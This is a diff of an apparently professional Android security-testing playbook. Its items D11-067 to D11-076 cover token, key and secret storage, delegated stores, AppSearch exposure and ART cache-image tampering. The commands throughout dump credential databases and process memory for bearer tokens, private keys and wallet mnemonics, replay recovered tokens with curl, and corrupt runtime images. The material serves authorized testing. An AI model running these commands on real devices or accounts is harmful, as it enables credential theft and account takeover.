-grep -rnE 'StrictMode\.(setThreadPolicy|setVmPolicy|enableDefaults)|penaltyLog\(' out/sources/
-grep -rniE 'setLogLevel|enableLogging|debugMode|loggingEnabled' out/sources/ -B4 | grep -inE 'room|realm|sugar|greendao|objectbox|sqlcipher'
+grep -rnE 'StrictMode\.(setThreadPolicy|setVmPolicy|enableDefaults)|penaltyLog\(' $DEC/jadx/sources/
+grep -rniE 'setLogLevel|enableLogging|debugMode|loggingEnabled' $DEC/jadx/sources/ -B4 | grep -inE 'room|realm|sugar|greendao|objectbox|sqlcipher'
 adb logcat --pid=$(adb shell pidof -s $PKG) | grep -iE 'StrictMode|SQL|query'
 ```
 - **Proof:** StrictMode or ORM debug output in logcat on a release build, ideally containing a query with
@@ -2299,7 +2416,7 @@ adb logcat --pid=$(adb shell pidof -s $PKG) | grep -iE 'StrictMode|SQL|query'
   they survive app data-clear and sometimes reinstall.
 - **How:**
 ```bash
-grep -rnE 'AccountManager|addAccountExplicitly|setAuthToken|getAuthToken|setPassword|setUserData' out/sources/
+grep -rnE 'AccountManager|addAccountExplicitly|setAuthToken|getAuthToken|setPassword|setUserData' $DEC/jadx/sources/
 adb shell dumpsys account | grep -A8 "$PKG"
 # rooted:
 adb shell su -c 'sqlite3 /data/system_ce/0/accounts_ce.db "select * from authtokens;"' 2>/dev/null
@@ -2340,7 +2457,7 @@ Java.perform(function () {
 adb shell pm list users
 adb shell pm list packages --user 10
 adb shell run-as $PKG --user 10 ls -la /data/user/10/$PKG 2>/dev/null
-grep -rnE 'INTERACT_ACROSS_PROFILES|CrossProfileApps|getUserHandle\(|UserManager' out/sources/
+grep -rnE 'INTERACT_ACROSS_PROFILES|CrossProfileApps|getUserHandle\(|UserManager' $DEC/jadx/sources/
 ```
 - **Proof:** Personal-profile and work-profile instances sharing a record — a file written under `/sdcard`
   by the work instance and read by the personal instance, or the same server-side session reachable from
@@ -2372,7 +2489,7 @@ grep -rnE 'INTERACT_ACROSS_PROFILES|CrossProfileApps|getUserHandle\(|UserManager
 fridump -U -s $PKG            # -s runs a strings pass
 strings -n 8 dump/* | grep -Ei 'eyJ[A-Za-z0-9_-]{10,}|Bearer |refresh_token|-----BEGIN'
 strings dump/* | grep -E '^([a-z]+ ){11}[a-z]+$'   # BIP-39 12-word mnemonics
-objection --gadget $PKG explore
+objection -S "$SERIAL" -g "$PKG" explore
 > memory search 'Bearer ' --string
 > memory dump all /tmp/mem.dump
 ```
@@ -2406,15 +2523,18 @@ SELECT * FROM byte[] b WHERE toString(b).matches(".*1\.2\.840\.113549\.1\.1\.1.*
   user authentication.
 - **How:**
 ```bash
-objection --gadget $PKG explore
-> android keystore list
-frida -D "$SERIAL" -f $PKG -l tracer-cipher.js     # WithSecure android-keystore-audit
+objection -S "$SERIAL" -g "$PKG" explore
+> android keystore list                                   # 0 aliases on a delegating app is NOT 'no keys' — see D11-074
+frida -D "$SERIAL" -f "$PKG" -l tracer-cipher.js          # interactive (spawn); WithSecure android-keystore-audit
+timeout 120 frida -D "$SERIAL" -f "$PKG" -l tracer-cipher.js -q -t 90 > logs/D11-067.txt   # headless: -t for spawn mode; the outer timeout because attach mode (-p) has ignored -t on frida 17.x
 ```
 - **Proof:** The tracer printing plaintext passed into `Cipher` with a key whose parameters show no
   `setUserAuthenticationRequired`, or a Keystore entry whose value is itself the secret in clear.
 - **Escalation:** -> D12 (key management), -> D13 (biometric-binding checks).
 - **Ruled out when:** Keystore holds only key material (not data), and keys used for sensitive decrypt are
-  user-authentication-bound with a `CryptoObject`. Move the key-derivation analysis to D12.
+  user-authentication-bound with a `CryptoObject`. Move the key-derivation analysis to D12. Run the alias census with a
+  positive control (a package known to hold aliases on the same device) and, where the app delegates crypto to another
+  package (D11-074), record that package's key info as context only (D12) — the app's own count is not the negative.
 
 ### D11-068 · Test/config artefacts shipped in the package (`assets/`, `res/raw/`, properties)
 
@@ -2424,22 +2544,17 @@ frida -D "$SERIAL" -f $PKG -l tracer-cipher.js     # WithSecure android-keystore
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) / `...for_internal_asset` (P3) |
 | **Attacker** | AM-01 (the APK is public) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | ivrodriguez ("developers forget to remove testing data/files"; "search the bundle directory for files that are not images"); Google "Embedded cryptography secrets" |
 
-- **Test:** Leftover test data, private keys and internal endpoint lists in `assets/`, `res/raw/` and bundled
-  JSON/properties. This is a superset of D11-027 aimed at whole files rather than string constants.
-- **How:**
-```bash
-find out/assets out/res/raw -type f | grep -viE '\.(png|jpg|jpeg|webp|gif|ttf|otf)$'
-grep -rInE '(BEGIN (RSA|EC|OPENSSH) PRIVATE KEY|aws_access_key_id|"private_key"|client_secret|"password")' out/assets out/res
-cat out/res/values/strings.xml | grep -iE 'staging|internal|test\.|\.dev|debug_url|backend'
-```
-- **Proof:** A live credential or an internal endpoint list recovered from a bundled file, with the file
-  name.
-- **Escalation:** -> D18 (third-party API), -> D01/D15 (internal endpoints as an attack map), -> D11-072
-  (the shadow API).
-- **Ruled out when:** Bundled non-image files hold only benign resources (localisation, layouts,
-  configuration with no secrets), verified by reading each one — not by grep alone.
+- **Test:** Cross-reference only — this item duplicated D11-027 (same `assets/`/`res/raw/` find, same private-key /
+  `aws_access_key_id` / `client_secret` greps, same ceiling, nodes and attacker), and both consume the secret sweep owned
+  by D02-047 and D18-004; its one distinct line (the internal-endpoint grep over `strings.xml`) now lives in D11-027.
+- **How:** run D11-027 once and record this row as `covered-by D11-027` with D11-027's log path; do not run a second sweep.
+- **Proof:** as D11-027.
+- **Escalation:** as D11-027 (-> D18, -> D01/D15, -> D11-072 for the shadow API).
+- **Ruled out when:** D11-027 is settled; a bundled-file secret is filed once, under D11-027 (or D02-047/D18-004 when
+  the sweep found it first), never under two ids.
 
 ### D11-069 · WorkManager / job-scheduler input and Firebase installation files as token homes
 
@@ -2459,8 +2574,9 @@ cat out/res/values/strings.xml | grep -iE 'staging|internal|test\.|\.dev|debug_u
   `PersistedInstallation.json`" with `auth_token`, `refresh_token`, `user_id`.
 - **How:**
 ```bash
-adb shell run-as $PKG sqlite3 databases/androidx.work.workdb 'select id,worker_class_name,input from WorkSpec;'
-adb shell run-as $PKG cat files/PersistedInstallation.json 2>/dev/null
+for s in '' -wal -shm; do adb exec-out run-as "$PKG" cat "databases/androidx.work.workdb$s" > "work.db$s" 2>/dev/null; done   # host-side sqlite3; the binary is absent on stock devices
+sqlite3 work.db 'select id,worker_class_name,input from WorkSpec;'
+adb shell run-as "$PKG" cat files/PersistedInstallation.json 2>/dev/null
 adb shell run-as $PKG find . -iname '*installation*' -o -iname '*fcm*' -o -iname '*fid*'
 ```
 - **Proof:** A token in `WorkSpec.input` or in `PersistedInstallation.json`, replayed against the relevant
@@ -2478,6 +2594,7 @@ adb shell run-as $PKG find . -iname '*installation*' -o -iname '*fcm*' -o -iname
 | **VRT** | n/a (reporting mechanics) |
 | **Attacker** | n/a |
 | **Applies to** | every D11 finding that is a payload for a reach primitive |
+| **Requires** | — |
 | **Maps to** | claude-bughunter chain-filing discipline ("one fix = one bounty; a chain is a severity amplifier, not a merge request") |
 
 - **Test:** A D11 payload (a plaintext token) and its reach primitive (a FileProvider traversal, a
@@ -2506,6 +2623,7 @@ adb shell run-as $PKG find . -iname '*installation*' -o -iname '*fcm*' -o -iname
 | **VRT** | n/a (reporting mechanics) |
 | **Attacker** | n/a |
 | **Applies to** | every D11 finding delivered as a PoC |
+| **Requires** | — |
 | **Maps to** | claude-bughunter evidence-hygiene (five-screenshot state-change pattern; HAR sanitising; the PII mask-vs-leave-visible split) |
 
 - **Test:** A storage-theft PoC needs the same rigour as a web state-change: pre-state, the extraction, the
@@ -2545,7 +2663,7 @@ adb shell run-as $PKG find . -iname '*installation*' -o -iname '*fcm*' -o -iname
 - **How:**
 ```bash
 adb shell run-as $PKG cat shared_prefs/*.xml | grep -oE 'https?://[^"<]+'
-grep -rnoE 'https?://[a-zA-Z0-9./_-]*(v[0-9]|api)[a-zA-Z0-9./_-]*' out/sources/ | sort -u
+grep -rnoE 'https?://[a-zA-Z0-9./_-]*(v[0-9]|api)[a-zA-Z0-9./_-]*' $DEC/jadx/sources/ | sort -u
 # recover the token (D11-011) and hit the mobile host's version directly
 curl -i -H "Authorization: Bearer <token>" https://api-v1.target.tld/v1/users/123
 curl -i -H "Authorization: Bearer <token>" https://api.target.tld/v3/users/123   # compare the web version
@@ -2590,6 +2708,84 @@ curl -i -H "Authorization: Bearer <stored-token>" -H 'Content-Type: application/
   retracted at triage.
 - **Ruled out when:** n/a — this is the verification step run before filing any storage-to-backend replay.
 
+### D11-074 · The sensitive store lives in ANOTHER package — locate the delegated store before sweeping the sandbox
+
+| | |
+|---|---|
+| **Severity ceiling** | Support (prevents a false "secure storage" negative) |
+| **VRT** | n/a — scoping gate |
+| **Attacker** | n/a |
+| **Applies to** | all apps that bind a platform, vendor-core or companion-SDK package for identity, payments, keys or sync (a thin client over binder) |
+| **Requires** | — |
+| **Maps to** | MASTG-TECH-0008; mechanism (observed in an engagement: a clean sandbox sweep on a delegating app read as "secure storage") |
+| **Record** | `logs/D11-074.txt` (the delegation table) |
+
+- **Skip when:** the D11-005 differential shows every marker landing under the app's own `/data/data/$PKG` — write `n/a — D11-074: all markers in own sandbox (D11-005 <date>)`.
+- **Test:** A clean sweep of the app's sandbox means nothing if the tokens, cards, keys or documents are persisted by a different UID the app talks to over binder. Before writing any D11 negative, name where each sensitive data class is actually persisted and whether that package is in scope.
+- **How:**
+```bash
+grep -rnoE 'bindService\(|createPackageContext\("[^"]+"|"com\.[a-z0-9.]+\.(gms|services|core|platform|vending)[a-z.]*"' $DEC/jadx/sources/ | sort -u | head -40
+grep -nE '<queries>|<package android:name' $DEC/apktool/AndroidManifest.xml
+grep -rnE 'asInterface\(|Stub\.Proxy|extends android\.os\.Binder' $DEC/jadx/sources/ | grep -iE 'pay|token|wallet|account|auth|key|sync' | head
+adb shell dumpsys package "$PKG" | grep -A3 'queries:'
+# rooted AVD: which package's data dir changes when the sensitive flow runs (marker from D11-005)
+adb shell su -c 'grep -rl x4hd2k9pq7 /data/data/'"$PKG"' /data/data/<delegate.pkg> 2>/dev/null'
+```
+- **Proof:** A table: sensitive class → owning package → in scope yes/no → where the sweep for that class ran (own sandbox / delegate / blocked).
+- **Escalation:** In-scope delegate → run D11-004..D11-069 against the delegate's sandbox; out of scope → mark each affected D11 row `blocked: delegated to <pkg>`, never `n/a` or a negative; -> D06 for the binder interface; -> D12-004 / D11-067 for keys held in the delegate's Keystore namespace (the app's own alias count is 0 by design there — not a negative).
+- **Ruled out when:** Every sensitive class is written by the app's own UID (the D11-005 marker appears in the app's own data dir), or the delegate is in scope and was swept with the same items.
+
+### D11-075 · Platform AppSearch donations — a persistence store AND a cross-app visibility surface
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium–High if another package can read documents the app indexed; Support otherwise |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) for the local copy |
+| **Attacker** | AM-03 (a zero-permission `GlobalSearchSession` reader); AM-05 |
+| **Applies to** | apps using `androidx.appsearch` with `PlatformStorage` (API 31+) or `LocalStorage` |
+| **Requires** | device, api>=31 |
+| **Maps to** | Android AppSearch developer guide (`SetSchemaRequest` visibility: `setSchemaTypeVisibilityForPackage`, `setPubliclyVisibleSchema`, `setSchemaTypeDisplayedBySystem` / `setDocumentClassDisplayedBySystem`); mechanism (observed) |
+| **Record** | `logs/D11-075.txt` (the schema block and the probe's search result) |
+
+- **Skip when:** `grep -rl 'androidx\.appsearch' $DEC/jadx/sources/ | wc -l` is 0 — write `n/a — D11-075: no androidx.appsearch class in $DEC`.
+- **Test:** Documents donated to PlatformStorage live under `/data/system_ce/<user>/appsearch/` (system-owned), outside the app's data dir, and are readable by other packages exactly as the schema visibility allows. Enumerate what the app indexes and the visibility it sets; D11-035 covers only `SearchRecentSuggestions`.
+- **How:**
+```bash
+grep -rnE 'PlatformStorage|LocalStorage\.createSearchSessionAsync|SetSchemaRequest|setSchemaTypeVisibilityForPackage|setPubliclyVisibleSchema|setSchemaTypeDisplayedBySystem|setDocumentClassDisplayedBySystem|setRequiredPermissionsForSchemaTypeVisibility|PutDocumentsRequest' $DEC/jadx/sources/ | head -40
+adb shell dumpsys appsearch 2>/dev/null | grep -iE "$PKG|schema|visib" | head -40      # AVD/userdebug
+adb shell su -c 'ls -la /data/system_ce/0/appsearch/' 2>/dev/null                        # rooted census
+# AM-03 proof: the probe app opens a GlobalSearchSession and searches for the D11-005 marker
+```
+- **Proof:** The probe's `GlobalSearchSession.search("<marker>")` returning a document the target indexed, or `dumpsys appsearch` showing a schema with package or public visibility; for the privacy half, PII documents with `displayedBySystem=true`.
+- **Escalation:** -> D20 (what the app chose to index); -> D04 if a system surface renders the document.
+- **Ruled out when:** The app does not use AppSearch, or every schema type is `setSchemaTypeDisplayedBySystem(false)` with no package/public visibility and the probe's search returns nothing — paste the `dumpsys appsearch` schema block. (The item lives here once; D20 cross-references it.)
+
+### D11-076 · App-writable ART artefacts under the app's own `cache/` — a destination for a cache-directory write primitive
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical if the mapped image is consumed unverified; HYPOTHESIS until the differential below runs |
+| **VRT** | outcome-rated (the code-execution node the consumer produces) |
+| **Attacker** | AM-03 chained to any write/create primitive into `cache/` (D11-047 zip-slip, D11-048 download traversal, a D07 provider write) |
+| **Applies to** | all |
+| **Requires** | device, root |
+| **Maps to** | ART runtime app image (`<dataDir>/cache/oat_primary/<isa>/base.art`); mechanism (observed mapped in `/proc/<pid>/maps`) |
+| **Record** | `logs/D11-076.txt` (the maps lines and the post-corruption logcat) |
+
+- **Skip when:** no write primitive into the sandbox exists (D11-002 all-no for write) — write `n/a — D11-076: no cache/ write primitive (D11-002 <date>)`.
+- **Test:** ART writes a runtime app image into the app's own `cache/oat_primary/<isa>/` and maps it on the next start. The file is owned by the app UID, so it is reachable by any create/overwrite primitive into `cache/` — which backup rules and most sweeps ignore. Evaluate — do not assume — whether the runtime validates it (dex checksum / image header) before trusting it; the write-direction list in D11-047 (`.db-journal`, `.xml.bak`, `lib-*/`) otherwise omits it.
+- **How:**
+```bash
+adb shell run-as "$PKG" ls -la cache/oat_primary/*/ 2>/dev/null
+adb shell su -c "cat /proc/$(adb shell pidof -s "$PKG")/maps" | grep -E 'oat_primary|\.art$|code_cache' | head
+# differential: corrupt one page, restart, observe (a) rejection + regeneration or (b) crash / changed behaviour
+adb shell run-as "$PKG" sh -c 'cp cache/oat_primary/arm64/base.art /data/local/tmp/base.art.bak; printf "\000" | dd of=cache/oat_primary/arm64/base.art bs=1 seek=4096 conv=notrunc'
+adb shell am force-stop "$PKG" && adb shell monkey -p "$PKG" 1 && adb logcat -d -s art dex2oat | tail -20
+```
+- **Proof:** Logcat showing ART mapping the modified image without rejecting it, or a controlled behaviour change; otherwise record "ART rejected and regenerated — safe" as the negative.
+- **Escalation:** -> D17 (code loading); D11-047/D11-048 and D07 primitives choose this destination; D02-042 is the sibling native drop-zone list.
+- **Ruled out when:** ART logs a verification failure and regenerates the file, and the process starts cleanly — paste the line.
+
 ## Graveyard for this domain
 
 | Observation | Why it is not a finding | What would make it one |
@@ -2606,7 +2802,7 @@ curl -i -H "Authorization: Bearer <stored-token>" -H 'Content-Type: application/
 | A field named `_cvv` / `card_token` in a decompiled model class | R8 keeps Gson-annotated dead fields; a field is not a write | A `putString`/`insert`/file-write that actually carries the field to disk (D11-006), confirmed with a runtime hook |
 | A four-digit string matching a card's last four across cache files | A four-digit run occurs by chance across hundreds of binary cache files (D11-008) | A Luhn-valid PAN-shaped 16-digit run, or a field-name hit, in a post-transaction dump |
 | `EncryptedSharedPreferences` / `flutter_secure_storage` / `react-native-keychain` present | Presence is not protection, but presence alone is also not a finding | The key has no `setUserAuthenticationRequired` and a Frida `Cipher` hook decrypts it on a merely-unlocked device (D11-013), or the app also stores the same class in cleartext elsewhere (D11-012) |
-| `getExternalFilesDir()` write on a targetSdk 30+ device | On Android 11+ `Android/data/<pkg>` is not readable by other ordinary apps; `WRITE_EXTERNAL_STORAGE` grants no extra access | The read succeeds from a second package (prove it, don't assert it), or the data lands in `Download`/`DCIM`/a public MediaStore collection which stay broadly readable (D11-041) |
+| `getExternalFilesDir()` write on a targetSdk 30+ device | On Android 11+ `Android/data/<pkg>` is not readable by other ordinary apps; `WRITE_EXTERNAL_STORAGE` grants no extra access; non-media files another app wrote to `Download/` are not readable either without All-Files access or SAF | The read succeeds from a second package (prove it, don't assert it), or the data lands in `Android/media/<pkg>` or a public MediaStore collection (indexed; readable by `READ_MEDIA_*` holders, AM-04 — D11-041's share-sheet pre-write) |
 | A cleartext token at rest with no replay attempted | Storage without impact is informational; GitHub Security Lab's $4,500 was a CodeQL query, not a report of plaintext prefs — do not cite it as precedent | The token replayed from a clean host returns the victim's data (D11-011); the replay is the finding |
 | Process memory holds a decrypted secret on a rooted device | AM-12 is not an attack; MASTG deprecated the standalone memory test; immutable `String`s cannot be reliably cleared, so this is expected | It falsifies a "never stored / hardware-backed" design claim, or the recovered key decrypts the local store and turns a Medium into a Critical (D11-066) — filed as a contributing factor to a root/debuggable finding |
 | A restorable preference that the app re-derives from the server on launch | The restore changes nothing; the server overwrites it before first use | The app trusts the restored value before contacting the server (D11-056) — proven by the first outbound request going to the attacker host |
